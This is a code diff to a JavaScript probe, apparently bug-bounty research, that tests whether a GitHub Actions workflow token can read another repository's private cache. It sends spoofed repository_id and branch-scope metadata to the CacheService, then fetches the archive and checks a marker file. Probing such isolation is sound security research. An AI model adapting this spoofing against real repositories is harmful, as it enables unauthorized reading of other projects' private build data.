@@ -3,9 +3,11 @@
 const crypto = require('crypto')
 const zlib = require('zlib')
 
-const BASELINE_CACHE_KEY = 'bbp-pages-public-cache-baseline-miss-20260918-r8-c91e'
+const BASELINE_CACHE_KEY = 'bbp-pages-public-cache-baseline-miss-20260918-r9-m7d4'
 const DONOR_CACHE_KEY = 'bbp-pages-private-cache-20260918-c91e'
 const DONOR_CACHE_VERSION = '9a41698a1c579c99c768ac86a2d875f88e262dafa9f57c8c1514bb2eb813a769'
+const DONOR_REPOSITORY_ID = '1375281864'
+const DONOR_REF = 'refs/heads/main'
 const DONOR_ARCHIVE_BYTES = 336
 const DONOR_MARKER_PATH_SUFFIX = 'cache-fixture/marker.txt'
 const DONOR_MARKER_BYTES = 39
@@ -15,7 +17,7 @@ const MAX_INFLATED_BYTES = 1024 * 1024
 const SERVICE = 'github.actions.results.api.v1.CacheService'
 
 function marker(name, level = 'notice') {
-  process.stderr.write(`::${level}::${name}_20260918_R8_C91E\n`)
+  process.stderr.write(`::${level}::${name}_20260918_R9_M7D4\n`)
 }
 
 function field(object, snakeName, camelName) {
@@ -150,6 +152,74 @@ function countMatchingMarkerEntries(tarBuffer, pathSuffix, expectedBytes, expect
   return matches
 }
 
+function classifyLookup(response) {
+  if (response.status === 401 || response.status === 403) return 'denied'
+  if (response.status === 400) return 'malformed'
+  if (response.status !== 200 || !isCacheLookupBody(response.body)) return 'failed'
+  return response.body.ok === true ? 'hit' : 'miss'
+}
+
+function donorRequest(metadata) {
+  const request = {
+    key: DONOR_CACHE_KEY,
+    restore_keys: [],
+    version: DONOR_CACHE_VERSION
+  }
+  if (metadata !== undefined) request.metadata = metadata
+  return request
+}
+
+async function validateDonorHit(response, prefix) {
+  const matchedKey = field(response.body, 'matched_key', 'matchedKey')
+  const signedUrl = field(response.body, 'signed_download_url', 'signedDownloadUrl')
+  if (matchedKey !== DONOR_CACHE_KEY || typeof signedUrl !== 'string' || signedUrl.length === 0) {
+    marker(`${prefix}_METADATA_MISMATCH`, 'warning')
+    return
+  }
+  marker(`${prefix}_METADATA_ACCEPTED`, 'warning')
+
+  let archiveUrl
+  try {
+    archiveUrl = validateBlobUrl(signedUrl)
+  } catch (_) {
+    marker(`${prefix}_SIGNED_URL_REJECTED`)
+    return
+  }
+  marker(`${prefix}_SIGNED_URL_ACCEPTED`, 'warning')
+
+  const archiveResponse = await fetchCacheArchive(archiveUrl)
+  if (archiveResponse.status !== 200 || !Buffer.isBuffer(archiveResponse.body)) {
+    marker(`${prefix}_ARCHIVE_READ_REJECTED`)
+    return
+  }
+  const archive = archiveResponse.body
+  marker(`${prefix}_ARCHIVE_READ_ACCEPTED`, 'warning')
+  if (archive.length !== DONOR_ARCHIVE_BYTES) {
+    marker(`${prefix}_ARCHIVE_SIZE_MISMATCH`, 'warning')
+    return
+  }
+
+  let tarBuffer
+  try {
+    tarBuffer = zlib.gunzipSync(archive, {maxOutputLength: MAX_INFLATED_BYTES})
+  } catch (_) {
+    marker(`${prefix}_ARCHIVE_FORMAT_MISMATCH`, 'warning')
+    return
+  }
+
+  const matches = countMatchingMarkerEntries(
+    tarBuffer,
+    DONOR_MARKER_PATH_SUFFIX,
+    DONOR_MARKER_BYTES,
+    DONOR_MARKER_SHA256
+  )
+  if (matches === 1) {
+    marker(`${prefix}_MARKER_CACHE_READ_ACCEPTED`, 'warning')
+  } else {
+    marker(`${prefix}_MARKER_HASH_MISMATCH`, 'warning')
+  }
+}
+
 async function liveProbe() {
   if (process.env.PAGES_BBP_LIVE_CACHE_PROBE !== '1') {
     throw new Error('live guard missing')
@@ -198,74 +268,73 @@ async function liveProbe() {
   }
   marker('PAGES_CACHE_BASELINE_OK')
 
-  const donor = await postJson(resultsUrl.origin, 'GetCacheEntryDownloadURL', runtimeToken, {
-    key: DONOR_CACHE_KEY,
-    restore_keys: [],
-    version: DONOR_CACHE_VERSION
-  })
-  runtimeToken = ''
-
-  if (donor.status === 401 || donor.status === 403) {
-    marker('PAGES_CACHE_CROSS_REPO_CACHE_REJECTED')
-    return
-  }
-  if (donor.status !== 200 || !isCacheLookupBody(donor.body)) {
-    marker('PAGES_CACHE_CROSS_REPO_QUERY_FAILED')
-    return
-  }
-  if (donor.body.ok !== true) {
-    marker('PAGES_CACHE_CROSS_REPO_CACHE_REJECTED')
-    return
-  }
-
-  const matchedKey = field(donor.body, 'matched_key', 'matchedKey')
-  const signedUrl = field(donor.body, 'signed_download_url', 'signedDownloadUrl')
-  if (matchedKey !== DONOR_CACHE_KEY || typeof signedUrl !== 'string' || signedUrl.length === 0) {
-    marker('PAGES_CACHE_CROSS_REPO_METADATA_MISMATCH', 'warning')
-    return
-  }
-  marker('PAGES_CACHE_CROSS_REPO_METADATA_ACCEPTED', 'warning')
-
-  let archiveUrl
-  try {
-    archiveUrl = validateBlobUrl(signedUrl)
-  } catch (_) {
-    marker('PAGES_CACHE_CROSS_REPO_SIGNED_URL_REJECTED')
-    return
-  }
-  marker('PAGES_CACHE_CROSS_REPO_SIGNED_URL_ACCEPTED', 'warning')
-
-  const archiveResponse = await fetchCacheArchive(archiveUrl)
-  if (archiveResponse.status !== 200 || !Buffer.isBuffer(archiveResponse.body)) {
-    marker('PAGES_CACHE_CROSS_REPO_ARCHIVE_READ_REJECTED')
-    return
-  }
-  const archive = archiveResponse.body
-  marker('PAGES_CACHE_CROSS_REPO_ARCHIVE_READ_ACCEPTED', 'warning')
-  if (archive.length !== DONOR_ARCHIVE_BYTES) {
-    marker('PAGES_CACHE_CROSS_REPO_ARCHIVE_SIZE_MISMATCH', 'warning')
-    return
-  }
-
-  let tarBuffer
-  try {
-    tarBuffer = zlib.gunzipSync(archive, { maxOutputLength: MAX_INFLATED_BYTES })
-  } catch (_) {
-    marker('PAGES_CACHE_CROSS_REPO_ARCHIVE_FORMAT_MISMATCH', 'warning')
-    return
-  }
-
-  const matches = countMatchingMarkerEntries(
-    tarBuffer,
-    DONOR_MARKER_PATH_SUFFIX,
-    DONOR_MARKER_BYTES,
-    DONOR_MARKER_SHA256
+  const noMetadata = await postJson(
+    resultsUrl.origin,
+    'GetCacheEntryDownloadURL',
+    runtimeToken,
+    donorRequest()
   )
-  if (matches === 1) {
-    marker('PAGES_CACHE_CROSS_REPO_MARKER_CACHE_READ_ACCEPTED', 'warning')
-  } else {
-    marker('PAGES_CACHE_CROSS_REPO_MARKER_HASH_MISMATCH', 'warning')
+  const noMetadataOutcome = classifyLookup(noMetadata)
+  if (noMetadataOutcome === 'hit') {
+    runtimeToken = ''
+    await validateDonorHit(noMetadata, 'PAGES_CACHE_NO_METADATA_CONTROL')
+    return
   }
+  if (noMetadataOutcome === 'failed' || noMetadataOutcome === 'malformed') {
+    runtimeToken = ''
+    marker('PAGES_CACHE_NO_METADATA_CONTROL_FAILED')
+    return
+  }
+  marker('PAGES_CACHE_NO_METADATA_CONTROL_REJECTED')
+
+  const repositoryMetadata = await postJson(
+    resultsUrl.origin,
+    'GetCacheEntryDownloadURL',
+    runtimeToken,
+    donorRequest({repository_id: DONOR_REPOSITORY_ID})
+  )
+  const repositoryMetadataOutcome = classifyLookup(repositoryMetadata)
+  if (repositoryMetadataOutcome === 'hit') {
+    runtimeToken = ''
+    await validateDonorHit(repositoryMetadata, 'PAGES_CACHE_REPOSITORY')
+    return
+  }
+  if (repositoryMetadataOutcome === 'failed') {
+    runtimeToken = ''
+    marker('PAGES_CACHE_REPOSITORY_METADATA_QUERY_FAILED')
+    return
+  }
+  marker(
+    repositoryMetadataOutcome === 'malformed'
+      ? 'PAGES_CACHE_REPOSITORY_METADATA_MALFORMED'
+      : 'PAGES_CACHE_REPOSITORY_METADATA_REJECTED'
+  )
+
+  const fullMetadata = await postJson(
+    resultsUrl.origin,
+    'GetCacheEntryDownloadURL',
+    runtimeToken,
+    donorRequest({
+      repository_id: DONOR_REPOSITORY_ID,
+      scope: [{scope: DONOR_REF, permission: '1'}]
+    })
+  )
+  runtimeToken = ''
+  const fullMetadataOutcome = classifyLookup(fullMetadata)
+  if (fullMetadataOutcome === 'hit') {
+    await validateDonorHit(fullMetadata, 'PAGES_CACHE_FULL')
+    return
+  }
+  if (fullMetadataOutcome === 'failed') {
+    marker('PAGES_CACHE_FULL_METADATA_QUERY_FAILED')
+    return
+  }
+  marker(
+    fullMetadataOutcome === 'malformed'
+      ? 'PAGES_CACHE_FULL_METADATA_MALFORMED'
+      : 'PAGES_CACHE_FULL_METADATA_REJECTED'
+  )
+  marker('PAGES_CACHE_METADATA_SPOOF_ALL_REJECTED')
 }
 
 function writeOctal(header, offset, length, value) {
@@ -283,6 +352,27 @@ function selfTest() {
     isCacheLookupBody(null)
   ) {
     throw new Error('cache lookup response validator self-test failed')
+  }
+
+  if (
+    classifyLookup({status: 401, body: {}}) !== 'denied' ||
+    classifyLookup({status: 400, body: {}}) !== 'malformed' ||
+    classifyLookup({status: 500, body: {}}) !== 'failed' ||
+    classifyLookup({status: 200, body: {}}) !== 'miss' ||
+    classifyLookup({status: 200, body: {ok: false}}) !== 'miss' ||
+    classifyLookup({status: 200, body: {ok: true}}) !== 'hit' ||
+    classifyLookup({status: 200, body: {ok: 'true'}}) !== 'failed'
+  ) {
+    throw new Error('cache lookup classifier self-test failed')
+  }
+
+  const plainRequest = donorRequest()
+  const metadataRequest = donorRequest({repository_id: DONOR_REPOSITORY_ID})
+  if (
+    Object.prototype.hasOwnProperty.call(plainRequest, 'metadata') ||
+    metadataRequest.metadata.repository_id !== DONOR_REPOSITORY_ID
+  ) {
+    throw new Error('cache metadata request self-test failed')
   }
 
   const data = Buffer.from('self-test-marker\n', 'utf8')
